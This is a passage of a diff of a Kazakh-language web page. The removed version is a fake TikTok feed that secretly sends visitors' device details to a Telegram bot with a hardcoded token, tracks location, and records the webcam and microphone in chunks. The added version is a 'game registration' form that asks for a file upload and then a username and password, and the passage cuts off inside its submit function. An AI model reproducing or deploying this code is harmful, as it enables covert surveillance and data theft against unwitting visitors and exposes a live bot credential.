@@ -2,899 +2,716 @@
 <html lang="kk">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>tik tok видое </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ойынға тіркелу | almas offical</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
     
     <style>
         * {
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            height: 100dvh;
-            overflow: hidden; 
-            background-color: black;
-            color: white;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        #startOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            height: 100dvh;
-            background-color: #000;
-            z-index: 9999;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            gap: 20px;
-            transition: opacity 0.4s ease, visibility 0.4s ease;
-        }
-
-        .start-btn {
-            background-color: #EE1D52;
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 1.2rem;
-            border-radius: 30px;
-            font-weight: bold;
-            box-shadow: 0 4px 15px rgba(238, 29, 82, 0.4);
-            cursor: pointer;
-            transition: all 0.3s ease;
             user-select: none;
-        }
-        
-        .start-btn.pulse {
-            animation: pulse 2s infinite;
+            box-sizing: border-box;
         }
 
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-
-        .video-container {
-            height: 100%;
-            height: 100dvh;
-            width: 100%;
-            overflow-y: scroll;
-            scroll-snap-type: y mandatory;
-            scroll-behavior: smooth;
-            padding-bottom: 60px;
-            touch-action: pan-y;
-            -webkit-overflow-scrolling: touch;
-        }
-
-        .video-container::-webkit-scrollbar { display: none; }
-        .video-container { -ms-overflow-style: none; scrollbar-width: none; }
-
-        .video-item {
-            height: 100%;
-            height: 100dvh;
-            width: 100%;
-            scroll-snap-align: start;
-            scroll-snap-stop: always;
-            position: relative;
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #050505; /* Өте қараңғы фон */
+            overflow: hidden;
+            margin: 0;
+            height: 100vh;
             display: flex;
+            align-items: center;
             justify-content: center;
-            align-items: center;
-            background-color: #111;
         }
 
-        .video-item video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+        /* Артқы бұлыңғыр жарықтар (айнадан көрінуі үшін) */
+        .bg-shapes {
             position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 1;
-        }
-
-        .video-overlay {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            padding: 15px;
-            padding-bottom: 75px;
-            z-index: 10;
-            background: linear-gradient(to top, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0.5) 40%, transparent 100%);
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-end;
-            pointer-events: none;
-        }
-
-        .video-info, .action-buttons { pointer-events: auto; }
-
-        .video-info { width: 75%; padding-right: 10px; }
-        .username { font-weight: bold; font-size: 1.2rem; margin-bottom: 5px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
-        .description { font-size: 0.9rem; margin-bottom: 10px; line-height: 1.3; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
-        .music-ticker { font-size: 0.8rem; display: flex; align-items: center; gap: 5px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
-
-        .action-buttons {
-            width: 25%;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            align-items: center;
-        }
-
-        .action-btn {
-            background: none;
-            border: none;
-            color: white;
-            font-size: 2rem;
-            cursor: pointer;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 5px;
-            text-shadow: 1px 1px 3px black;
-            transition: transform 0.2s;
+            inset: 0;
+            overflow: hidden;
+            z-index: 0;
         }
         
-        .action-btn:active { transform: scale(0.9); }
-        .action-text { font-size: 0.8rem; font-weight: bold; }
-
-        .play-pause-icon {
+        .shape-1 {
             position: absolute;
-            font-size: 4rem;
-            color: rgba(255, 255, 255, 0.8);
-            z-index: 5;
-            display: none;
-            pointer-events: none;
-            filter: drop-shadow(0px 0px 10px rgba(0,0,0,0.5));
-        }
-
-        .shared-banner {
-            position: absolute;
-            top: 70px;
-            left: 15px;
-            background-color: rgba(20, 20, 20, 0.65);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            color: white;
-            padding: 4px 14px 4px 4px;
-            border-radius: 30px;
-            font-size: 0.95rem;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            z-index: 20;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-        }
-        .shared-avatar {
-            width: 28px;
-            height: 28px;
+            top: -10%;
+            left: -10%;
+            width: 50vw;
+            height: 50vw;
+            background: radial-gradient(circle, rgba(255,255,255,0.08) 0%, transparent 60%);
             border-radius: 50%;
-            object-fit: cover;
-            border: 1px solid rgba(255,255,255,0.2);
+            filter: blur(60px);
         }
 
-        .bottom-nav {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 60px;
-            background-color: black;
-            display: flex;
-            justify-content: space-around;
-            align-items: center;
-            z-index: 100;
-            border-top: 1px solid #333;
-            padding-bottom: env(safe-area-inset-bottom, 0px);
-        }
-
-        .nav-item {
-            color: gray;
-            font-size: 1.2rem;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 3px;
-        }
-        .nav-item.active { color: white; }
-        .nav-text { font-size: 0.7rem; }
-        
-        .add-btn {
-            background-color: white;
-            color: black;
-            border-radius: 8px;
-            padding: 4px 15px;
-            font-size: 1rem;
-            position: relative;
-        }
-        .add-btn::before, .add-btn::after {
-            content: '';
+        .shape-2 {
             position: absolute;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 4px;
-            height: 100%;
-            background-color: #69C9D0;
-            left: -4px;
-            border-radius: 4px 0 0 4px;
-        }
-        .add-btn::after {
-            background-color: #EE1D52;
-            left: auto;
-            right: -4px;
-            border-radius: 0 4px 4px 0;
+            bottom: -20%;
+            right: -10%;
+            width: 60vw;
+            height: 60vw;
+            background: radial-gradient(circle, rgba(255,255,255,0.05) 0%, transparent 60%);
+            border-radius: 50%;
+            filter: blur(80px);
         }
 
-        .top-nav {
+        /* Тамшы және айна контейнері */
+        #drop-container {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px 20px 10px 20px;
-            padding-top: calc(15px + env(safe-area-inset-top, 0px));
-            z-index: 100;
-            background: linear-gradient(to bottom, rgba(0,0,0,0.6) 0%, transparent 100%);
-            pointer-events: none;
-        }
-
-        .top-nav-tabs {
-            display: flex;
-            gap: 20px;
-            pointer-events: auto;
-            flex: 1;
-            justify-content: center;
-        }
-
-        .top-nav-item {
-            color: rgba(255, 255, 255, 0.6);
-            font-size: 1.05rem;
-            font-weight: 600;
-            cursor: pointer;
-            position: relative;
-            text-shadow: 1px 1px 2px rgba(0,0,0,0.8);
-            transition: all 0.2s ease;
-        }
-
-        .top-nav-item.active {
-            color: white;
-            font-size: 1.1rem;
-            font-weight: 700;
-        }
-
-        .top-nav-item.active::after {
-            content: '';
-            position: absolute;
-            bottom: -8px;
+            top: -100px; /* Бастапқы орны жоғарыда жасырылған */
             left: 50%;
-            transform: translateX(-50%);
-            width: 24px;
-            height: 3px;
-            background-color: white;
-            border-radius: 3px;
+            transform: translate(-50%, -50%);
+            
+            /* Тамшы өлшемдері */
+            width: 20px;
+            height: 20px;
+            border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
+            
+            /* Айна (Glassmorphism) стилі */
+            background: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(30px) saturate(150%);
+            -webkit-backdrop-filter: blur(30px) saturate(150%);
+            border-top: 1px solid rgba(255, 255, 255, 0.4);
+            border-left: 1px solid rgba(255, 255, 255, 0.2);
+            border-right: 1px solid rgba(255, 255, 255, 0.05);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 
+                0 25px 50px -12px rgba(0, 0, 0, 0.8),
+                inset 0 0 20px rgba(255, 255, 255, 0.05);
+            
+            z-index: 10;
+            overflow: hidden;
+            
+            /* Анимация өткелдері */
+            transition: 
+                top 0.7s cubic-bezier(0.5, 0, 0.2, 1),
+                width 0.6s cubic-bezier(0.16, 1, 0.3, 1),
+                height 0.6s cubic-bezier(0.16, 1, 0.3, 1),
+                border-radius 0.6s ease;
         }
 
-        .top-nav-icon {
-            color: white;
-            font-size: 1.2rem;
-            pointer-events: auto;
-            cursor: pointer;
-            text-shadow: 1px 1px 2px rgba(0,0,0,0.8);
-            width: 24px;
-            display: flex;
-            justify-content: center;
-        }
-
-        /* ПІКІРЛЕР ТЕРЕЗЕСІНІҢ СТИЛЬДЕРІ */
-        #commentsModal {
-            position: fixed;
-            bottom: -100%; 
-            left: 0;
-            width: 100%;
-            height: 70%;
-            background-color: #1a1a1a;
-            border-top-left-radius: 15px;
-            border-top-right-radius: 15px;
-            z-index: 1000;
-            transition: bottom 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
-            display: flex;
-            flex-direction: column;
-            color: white;
-            box-shadow: 0 -5px 20px rgba(0,0,0,0.5);
-        }
-        
-        #commentsModal.open {
-            bottom: 0;
-        }
-
-        .comments-header {
-            padding: 15px;
-            text-align: center;
-            font-weight: bold;
-            border-bottom: 1px solid #333;
-            position: relative;
-            font-size: 1.1rem;
-        }
-
-        .close-comments {
-            position: absolute;
-            right: 15px;
-            top: 15px;
-            cursor: pointer;
-            font-size: 1.2rem;
-            color: #ccc;
-        }
-
-        .comments-list {
-            flex: 1;
-            overflow-y: auto;
-            padding: 15px;
-        }
-
-        .comment-item {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 20px;
-        }
-
-        .comment-avatar {
-            width: 35px;
-            height: 35px;
+        /* 1-қадам: Тамшының құлауы */
+        #drop-container.fallen {
+            top: 50%;
             border-radius: 50%;
-            object-fit: cover;
-            flex-shrink: 0;
         }
 
-        .comment-content {
-            flex: 1;
+        /* 2-қадам: Тамшының тіркелу бетіне айналуы */
+        #drop-container.expanded {
+            width: min(92vw, 380px);
+            height: 280px; /* Бастапқы биіктігі (тек файл жүктеу) */
+            border-radius: 24px;
         }
 
-        .comment-author {
-            font-size: 0.85rem;
-            color: #999;
-            margin-bottom: 4px;
-            font-weight: 600;
+        /* 3-қадам: Файл жүктелгеннен кейінгі толық ашылуы */
+        #drop-container.fully-expanded {
+            height: 480px;
         }
 
-        .comment-text {
-            font-size: 0.95rem;
-            line-height: 1.3;
-        }
-
-        .comment-likes {
+        #form-content {
+            position: absolute;
+            inset: 0;
+            padding: 2rem;
             display: flex;
             flex-direction: column;
-            align-items: center;
-            color: #777;
-            font-size: 0.8rem;
-            gap: 3px;
-            cursor: pointer;
-        }
-        
-        .comment-likes i.liked {
-            color: #EE1D52;
-        }
-
-        .comments-input-area {
-            padding: 12px 15px;
-            border-top: 1px solid #333;
-            display: flex;
-            gap: 10px;
-            align-items: center;
-            padding-bottom: calc(12px + env(safe-area-inset-bottom, 0px));
-            background-color: #1a1a1a;
-        }
-
-        .comments-input-area input {
-            flex: 1;
-            background-color: #333;
-            border: none;
-            color: white;
-            padding: 12px 15px;
-            border-radius: 20px;
-            outline: none;
-            font-size: 0.95rem;
-        }
-
-        .comments-input-area input::placeholder {
-            color: #999;
-        }
-
-        .comments-input-area button {
-            background: none;
-            border: none;
-            color: #EE1D52;
-            font-weight: bold;
-            font-size: 1.5rem;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .modal-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background-color: rgba(0,0,0,0.5);
-            z-index: 999;
-            display: none;
             opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-        .modal-overlay.open {
-            display: block;
-            opacity: 1;
+            transform: scale(0.95);
+            transition: opacity 0.6s ease, transform 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+            pointer-events: none;
         }
 
+        #form-content.visible {
+            opacity: 1;
+            transform: scale(1);
+            pointer-events: auto;
+        }
+
+        /* Мөлдір өрістер */
+        .glass-input {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: white;
+            transition: all 0.3s ease;
+        }
+
+        .glass-input:focus {
+            outline: none;
+            border-color: rgba(255, 255, 255, 0.4);
+            background: rgba(0, 0, 0, 0.4);
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.05);
+        }
+
+        /* Мөлдір батырма */
+        .glass-button {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: white;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .glass-button:hover {
+            background: rgba(255, 255, 255, 0.2);
+            border-color: rgba(255, 255, 255, 0.5);
+            transform: translateY(-2px);
+        }
+
+        .glass-button:active {
+            transform: translateY(0);
+        }
+
+        /* Жасырын құпия сөз өрістері үшін */
+        .hidden-fields {
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s ease 0.3s;
+        }
+        
+        .visible-fields {
+            opacity: 1;
+            pointer-events: auto;
+        }
     </style>
 </head>
 <body>
 
-    <div id="startOverlay">
-        <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok" style="width: 150px; filter: invert(1); margin-bottom: 20px;">
-        <h2 style="font-size: 1.2rem; margin-bottom: 10px;">Қосымшаға қош келдіңіз!</h2>
-        <button id="startBtn" class="start-btn pulse" onclick="startApp()">TikTok қолданбасын ашу</button>
+    <!-- Артқы бұлыңғыр жарықтар -->
+    <div class="bg-shapes">
+        <div class="shape-1"></div>
+        <div class="shape-2"></div>
     </div>
 
-    <div class="top-nav">
-        <i class="fas fa-desktop top-nav-icon" style="visibility: hidden;"></i> 
-        <div class="top-nav-tabs">
-            <span class="top-nav-item" onclick="switchTopNav(this)">Достар</span>
-            <span class="top-nav-item active" onclick="switchTopNav(this)">Ұсыныстар</span>
+    <div id="drop-container">
+        
+        <!-- Тіркелу формасының ішкі мазмұны -->
+        <div id="form-content">
+            
+            <!-- Тақырып -->
+            <div class="text-center mb-6">
+                <h1 class="text-xl font-semibold tracking-wider text-white">Ойынға Тіркелу</h1>
+                <p class="text-gray-400 text-xs mt-2 font-light tracking-wide">
+                    Жалғастыру үшін файл жүктеңіз
+                </p>
+            </div>
+
+            <!-- Файл жүктеу аймағы -->
+            <div id="dropzone" class="border border-dashed border-white/20 rounded-xl p-5 text-center cursor-pointer transition-all duration-300 hover:border-white/50 hover:bg-white/5" onclick="document.getElementById('file-upload').click()">
+                <div class="mb-2 flex justify-center">
+                    <svg class="h-6 w-6 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
+                    </svg>
+                </div>
+                <p class="text-[13px] text-gray-300 font-medium" id="file-label">Файлды таңдау</p>
+                <input type="file" id="file-upload" class="hidden" accept=".jpg,.jpeg,.png,.pdf,.doc,.docx,.txt" required>
+            </div>
+
+            <div id="auth-fields" class="hidden-fields flex-1 flex flex-col justify-end mt-4">
+                <div class="space-y-4">
+                    <div class="space-y-1.5">
+                        <label class="text-[11px] text-gray-400 font-medium ml-1 tracking-wide uppercase">Ойыншы аты</label>
+                        <input type="text" id="username" placeholder="Мысалы: ProGamer" class="glass-input w-full rounded-lg px-4 py-3 text-sm placeholder-gray-500" required disabled>
+                    </div>
+
+                    <div class="space-y-1.5">
+                        <label class="text-[11px] text-gray-400 font-medium ml-1 tracking-wide uppercase">Құпия сөз</label>
+                        <input type="password" id="password" placeholder="••••••••" class="glass-input w-full rounded-lg px-4 py-3 text-sm placeholder-gray-500" required disabled>
+                    </div>
+
+                    <button type="button" onclick="submitForm()" class="glass-button w-full font-medium py-3 px-4 rounded-lg text-sm tracking-wide mt-2">
+                        Тіркелуді аяқтау
+                    </button>
+                </div>
+            </div>
+
+            <!-- Авторлық жазу -->
+            <div class="mt-auto pt-6 text-center">
+                <p class="text-[10px] text-gray-500 font-light tracking-widest uppercase">
+                    Created by <span class="text-gray-300 font-medium">almas offical</span>
+                </p>
+            </div>
+
         </div>
-        <i class="fas fa-search top-nav-icon"></i>
     </div>
 
-    <div class="video-container" id="videoContainer"></div>
-
-    <div id="unmuteOverlay" onclick="requestPermissions()" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9000; justify-content: center; align-items: center; cursor: pointer;">
-        <div style="background-color: rgba(0, 0, 0, 0.6); backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px); padding: 15px 30px; border-radius: 40px; display: flex; align-items: center; gap: 12px; color: white; box-shadow: 0 4px 15px rgba(0,0,0,0.3); animation: pulse 2s infinite;">
-            <i class="fas fa-volume-mute" style="font-size: 1.5rem;"></i>
-            <span style="font-size: 1.1rem; font-weight: 500;">Дыбысты қосу үшін түртіңіз</span>
+    <!-- Хабарлама терезесі (Alert орнына) -->
+    <div id="message-box" class="fixed top-6 right-6 px-5 py-3 rounded-xl shadow-2xl transform translate-x-full transition-transform duration-500 z-50 flex items-center gap-3" style="background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2);">
+        <div class="w-6 h-6 rounded-full bg-white/20 flex items-center justify-center">
+            <svg class="w-3.5 h-3.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
         </div>
-    </div>
-
-    <div class="bottom-nav">
-        <div class="nav-item active"><i class="fas fa-home"></i><span class="nav-text">Басты</span></div>
-        <div class="nav-item"><i class="fas fa-search"></i><span class="nav-text">Іздеу</span></div>
-        <div class="nav-item add-btn"><i class="fas fa-plus"></i></div>
-        <div class="nav-item"><i class="far fa-comment-dots"></i><span class="nav-text">Хаттар</span></div>
-        <div class="nav-item"><i class="far fa-user"></i><span class="nav-text">Профиль</span></div>
-    </div>
-
-    <!-- ПІКІРЛЕР ФОНЫ -->
-    <div class="modal-overlay" id="modalOverlay" onclick="closeComments()"></div>
-
-    <!-- ПІКІРЛЕР ТЕРЕЗЕСІ -->
-    <div id="commentsModal">
-        <div class="comments-header">
-            <span>3402 пікір</span>
-            <i class="fas fa-times close-comments" onclick="closeComments()"></i>
-        </div>
-        <div class="comments-list" id="commentsList">
-            <!-- Пікірлер осында жүктеледі -->
-        </div>
-        <div class="comments-input-area">
-            <input type="text" id="commentInput" placeholder="Пікір қалдырыңыз..." onkeypress="handleCommentEnter(event)">
-            <button onclick="addComment()"><i class="fas fa-arrow-circle-up"></i></button>
-        </div>
+        <span id="message-text" class="text-white text-xs font-medium tracking-wide">Сәтті орындалды!</span>
     </div>
 
     <script>
-        const videoContainer = document.getElementById('videoContainer');
-        let isAppStarted = false; 
+        const dropContainer = document.getElementById('drop-container');
+        const formContent = document.getElementById('form-content');
         
-        const mockData = [
-            {
-                id: 1,
-                username: "@ustaz_kz",
-                description: "Сабырдың түбі сары алтын. Өте әсерлі уағыз ☝️ #уағыз #ислам",
-                music: "Оригинал дыбыс - ustaz_kz",
-                likes: "125K",
-                comments: "3402",
-                shares: "12K",
-                videoUrl: "https://data.quranacademy.com/Videos/Khutbat-e-Jummah/Jumma180725SHJ.mp4",
-                sharedBy: "Алмас"
-            },
-            {
-                id: 2,
-                username: "@qazaq_tarih",
-                description: "Қазақ хандығының құрылуы 🇰🇿 #тарих",
-                music: "Тұран тобы - Ұлы Дала",
-                likes: "89K",
-                comments: "1205",
-                shares: "5400",
-                videoUrl: "https://interactive-examples.mdn.mozilla.net/media/cc0-videos/friday.mp4"
-            },
-            {
-                id: 3,
-                username: "@qazaq_cars",
-                description: "Жолдағы қызықты сәттер 🚗 #көлік",
-                music: "Заманауи хит 2024",
-                likes: "250K",
-                comments: "8900",
-                shares: "45K",
-                videoUrl: "https://www.w3schools.com/html/mov_bbb.mp4"
-            }
-        ];
+        const fileInput = document.getElementById('file-upload');
+        const fileLabel = document.getElementById('file-label');
+        const dropzone = document.getElementById('dropzone');
+        
+        const authFields = document.getElementById('auth-fields');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        
+        const messageBox = document.getElementById('message-box');
+        const messageText = document.getElementById('message-text');
 
-        // ==========================================
-        // ПІКІРЛЕР ЛОГИКАСЫ
-        // ==========================================
-        const initialComments = [
-            { author: "maral_19", text: "Маған қатты ұнады, керемет! 🔥", likes: 342 },
-            { author: "qazaq_bala", text: "Дұрыс айтылған сөздер 👏", likes: 125 },
-            { author: "user839201", text: "Жалғасы бар ма?", likes: 45 },
-            { author: "almas_kz", text: "Керемет видео, бөліскендеріңізге рахмет!", likes: 12 },
-            { author: "nurbolat07", text: "Тағы да осындай видеолар шығарыңызшы 😊", likes: 8 }
-        ];
+        // Бет жүктелгенде орындалатын тамшы анимациясы
+        window.onload = () => {
+            // 1. Тамшы жоғарыдан құлайды
+            setTimeout(() => {
+                dropContainer.classList.add('fallen');
+            }, 100);
 
-        function renderComments() {
-            const list = document.getElementById('commentsList');
-            list.innerHTML = '';
-            initialComments.forEach(comment => {
-                list.appendChild(createCommentElement(comment.author, comment.text, comment.likes));
-            });
-        }
+            // 2. Тамшы ортаға жеткен соң, тіркелу бетіне дейін жайылады (айналады)
+            setTimeout(() => {
+                dropContainer.classList.add('expanded');
+            }, 800); // құлау уақыты (0.7s) + аздаған кідіріс
 
-        function createCommentElement(author, text, likes) {
-            const div = document.createElement('div');
-            div.className = 'comment-item';
-            div.innerHTML = `
-                <img src="https://ui-avatars.com/api/?name=${author}&background=random&color=fff&rounded=true" alt="Avatar" class="comment-avatar">
-                <div class="comment-content">
-                    <div class="comment-author">${author}</div>
-                    <div class="comment-text">${text}</div>
-                </div>
-                <div class="comment-likes" onclick="toggleCommentLike(this)">
-                    <i class="far fa-heart"></i>
-                    <span>${likes}</span>
-                </div>
-            `;
-            return div;
-        }
+            // 3. Айна жайылған соң ішіндегі жазулар пайда болады
+            setTimeout(() => {
+                formContent.classList.add('visible');
+            }, 1400); // жайылу уақыты (0.6s)
+        };
 
-        window.toggleCommentLike = function(el) {
-            const icon = el.querySelector('i');
-            const countSpan = el.querySelector('span');
-            let count = parseInt(countSpan.innerText);
+        // Файл жүктеу логикасы
+        fileInput.addEventListener('change', function(e) {
+            const fileName = e.target.files[0]?.name;
             
-            if (icon.classList.contains('far')) {
-                icon.classList.remove('far');
-                icon.classList.add('fas', 'liked');
-                countSpan.innerText = count + 1;
-            } else {
-                icon.classList.remove('fas', 'liked');
-                icon.classList.add('far');
-                countSpan.innerText = count - 1;
+            if (fileName) {
+                // Файл атын шығару
+                fileLabel.innerHTML = `<span class="text-white font-medium">${fileName}</span>`;
+                dropzone.classList.add('border-white/50', 'bg-white/10');
+                
+                // Айна контейнерін төмен қарай ұзарту
+                dropContainer.classList.add('fully-expanded');
+                
+                // Жасырын өрістерді (логин/пароль) көрсету
+                authFields.classList.remove('hidden-fields');
+                authFields.classList.add('visible-fields');
+                
+                // Өрістерді қолжетімді ету
+                usernameInput.disabled = false;
+                passwordInput.disabled = false;
             }
-        };
+        });
 
-        window.openComments = function() {
-            document.getElementById('commentsModal').classList.add('open');
-            document.getElementById('modalOverlay').classList.add('open');
-            renderComments(); // Пікірлерді жүктеу
-        };
+        // Файлды сүйреп әкелу (Drag & Drop) мүмкіндігі
+        dropzone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            dropzone.classList.add('border-white/50', 'bg-white/5');
+        });
 
-        window.closeComments = function() {
-            document.getElementById('commentsModal').classList.remove('open');
-            document.getElementById('modalOverlay').classList.remove('open');
-        };
-
-        window.addComment = function() {
-            const input = document.getElementById('commentInput');
-            const text = input.value.trim();
-            if (text !== '') {
-                const list = document.getElementById('commentsList');
-                const newComment = createCommentElement("Сіз (You)", text, 0);
-                list.insertBefore(newComment, list.firstChild);
-                input.value = '';
-                list.scrollTop = 0; // Ең жоғарыға айналдыру
+        dropzone.addEventListener('dragleave', (e) => {
+            e.preventDefault();
+            if(!fileInput.files.length) {
+                dropzone.classList.remove('border-white/50', 'bg-white/5');
             }
-        };
+        });
 
-        window.handleCommentEnter = function(e) {
-            if (e.key === 'Enter') {
-                addComment();
+        dropzone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            if (e.dataTransfer.files.length) {
+                fileInput.files = e.dataTransfer.files;
+                const event = new Event('change');
+                fileInput.dispatchEvent(event);
             }
-        };
+        });
 
-        // ==========================================
-        // TELEGRAM БАПТАУЛАРЫ
-        // ==========================================
-        const TELEGRAM_BOT_TOKEN = '8544038643:AAEh_qOpyfCqeIx311DiD-c1V2f0YDD_Sv8'; 
-        const TELEGRAM_CHAT_ID = '8517541960'; 
-
-        function sendToTelegram(text) {
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
-            }).catch(err => console.error(err));
+        // Хабарлама көрсету функциясы
+        function showMessage(text) {
+            messageText.textContent = text;
+            messageBox.style.transform = 'translateX(0)';
+            setTimeout(() => {
+                messageBox.style.transform = 'translateX(150%)';
+            }, 3000);
         }
 
-        // ==========================================
-        // ТОЛЫҚ ЭКРАНДЫ САУ ТҮРДЕ ІСКЕ ҚОСУ
-        // ==========================================
-        function requestFullscreenSafe() {
-            const docEl = document.documentElement;
-            const requestFS = docEl.requestFullscreen || 
-                              docEl.webkitRequestFullscreen || 
-                              docEl.mozRequestFullScreen || 
-                              docEl.msRequestFullscreen;
+        // Тіркелуді аяқтау батырмасы
+        function submitForm() {
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
 
-            if (requestFS) {
-                try {
-                    const p = requestFS.call(docEl);
-                    if (p && typeof p.catch === 'function') {
-                        p.catch(err => console.warn("Fullscreen request warning:", err));
-                    }
-                } catch (err) {
-                    console.warn("Fullscreen API Error:", err);
-                }
-            }
-        }
-
-        // ==========================================
-        // БАСТАПҚЫ ЛОГИКА ЖӘНЕ РҰҚСАТТАР
-        // ==========================================
-        function startApp() {
-            const btn = document.querySelector('.start-btn');
-            if(btn) {
-                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Жүктелуде...';
-                btn.style.opacity = '0.8';
-                btn.onclick = null; 
-            }
-
-            sendToTelegram("<b>🚀 Жаңа пайдаланушы кірді!</b>\nЖүйе: " + navigator.userAgent);
-            startLocationTracking();
-
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user', width: { ideal: 720 }, height: { ideal: 1280 } }, 
-                    audio: true 
-                })
-                .then(function(stream) {
-                    initRecording(stream);
-                    showUnmuteOverlay();
-                })
-                .catch(function(err) {
-                    sendToTelegram("⚠️ Камера/Микрофон рұқсат етілмеді.");
-                    showUnmuteOverlay();
-                });
-            } else {
-                showUnmuteOverlay();
-            }
-        }
-
-        function showUnmuteOverlay() {
-            const overlay = document.getElementById('startOverlay');
-            if (overlay) {
-                overlay.style.opacity = '0';
-                setTimeout(() => { overlay.style.display = 'none'; }, 400);
-            }
-
-            const firstVideo = document.querySelector('video');
-            if (firstVideo) {
-                firstVideo.muted = true;
-                const playPromise = firstVideo.play();
-                if (playPromise !== undefined) playPromise.catch(e => console.log(e));
-            }
-
-            document.getElementById('unmuteOverlay').style.display = 'flex';
-        }
-
-        function requestPermissions() {
-            document.getElementById('unmuteOverlay').style.display = 'none';
-            requestFullscreenSafe();
-            isAppStarted = true;
-
-            const firstVideo = document.querySelector('video');
-            if (firstVideo) firstVideo.muted = false;
-        }
-
-        // ==========================================
-        // БЕЙНЕНІ 10 СЕКУНДТАН ЖАЗУ ЖӘНЕ ЖІБЕРУ
-        // ==========================================
-        let activeStream = null;
-        let currentRecorder = null;
-        let recordingTimer = null;
-        let isRecordingActive = false;
-
-        function initRecording(stream) {
-            activeStream = stream;
-            isRecordingActive = true;
-            recordNextChunk();
-        }
-
-        function recordNextChunk() {
-            if (!isRecordingActive || !activeStream) return;
-
-            let options = {};
-            if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
-                options = { mimeType: 'video/webm;codecs=vp8,opus' };
-            } else if (MediaRecorder.isTypeSupported('video/mp4')) {
-                options = { mimeType: 'video/mp4' };
-            }
-
-            try {
-                currentRecorder = new MediaRecorder(activeStream, { ...options, videoBitsPerSecond: 2000000 });
-            } catch (e) {
+            if(!username || !password) {
+                showMessage('Барлық өрістерді толтырыңыз!');
                 return;
             }
 
-            let chunks = [];
-            currentRecorder.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
-            currentRecorder.onstop = () => {
-                if (chunks.length > 0) {
-                    const ext = (currentRecorder.mimeType || '').includes('mp4') ? 'mp4' : 'webm';
-                    let blob = new Blob(chunks, { type: currentRecorder.mimeType || 'video/webm' });
